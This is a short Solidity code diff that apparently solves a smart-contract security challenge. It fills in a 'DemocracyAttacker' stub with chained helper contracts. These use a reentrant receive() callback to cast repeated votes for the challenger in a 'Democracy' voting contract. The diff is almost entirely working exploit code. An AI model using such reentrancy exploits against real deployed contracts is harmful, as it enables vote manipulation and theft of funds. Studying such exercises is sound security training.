@@ -181,7 +181,43 @@ contract Democracy is Ownable, ERC721 {
 }
 
 contract DemocracyAttacker {
+    Democracy democracy;
+    DemocracyAttackerHelper public helper0;
+    DemocracyAttackerHelper public helper1;
+
+    constructor(Democracy democracy_) {
+        democracy = democracy_;
+        helper1 = new DemocracyAttackerHelper(DemocracyAttackerHelper(payable(address(0))), democracy);
+        helper0 = new DemocracyAttackerHelper(helper1, democracy);
+    }
+
+    function attack() public {
+        helper0.maliciousVote();
+    }
+
     receive () external payable {
         
+    }
+}
+
+contract DemocracyAttackerHelper {
+    DemocracyAttackerHelper next;
+    Democracy democracy;
+
+    constructor(DemocracyAttackerHelper next_, Democracy democracy_) {
+        next = next_;
+        democracy = democracy_;
+    }
+
+    function maliciousVote() public {
+        democracy.vote(democracy.challenger());
+    }
+
+    receive() external payable {
+        if (address(next) != address(0)) {
+            (bool ok,) = democracy.challenger().call{value: address(this).balance}("");
+            require(ok);
+            next.maliciousVote();
+        }
     }
 }
